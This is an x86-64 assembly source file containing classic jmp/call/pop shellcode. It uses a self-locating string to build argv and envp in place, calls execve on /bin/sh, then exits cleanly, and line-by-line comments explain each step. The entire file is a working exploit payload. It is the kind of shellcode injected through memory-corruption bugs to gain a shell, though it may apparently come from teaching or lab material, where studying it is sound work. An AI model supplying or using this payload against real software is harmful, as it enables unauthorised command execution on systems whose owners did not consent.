#include <sys/syscall.h>

#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+8)

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  pop    rbx                    /* rbx points to STRING */
  mov    [ARGV + rbx],rbx       /* set up argv[0] pointer to pathname */
  xor    rax,rax                /* get a 64-bit zero value */
  mov    [STRLEN + rbx],al      /* null-terminate our string */
  mov    [ENVP + rbx],rax       /* set up null envp */

  mov    al,SYS_execve          /* syscall number */
  mov    rdi,rbx                /* arg 1: string pathname */
  lea    rsi,[ARGV + rbx]       /* arg 2: argv */
  lea    rdx,[ENVP + rbx]       /* arg 3: envp */
  syscall                       /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */

  xor    rdi,rdi                /* arg 1: 0 */
  xor    rax,rax
  mov    al,SYS_exit
  syscall                       /* exit(0) */

calladdr:
  call    popladdr
  .string STRING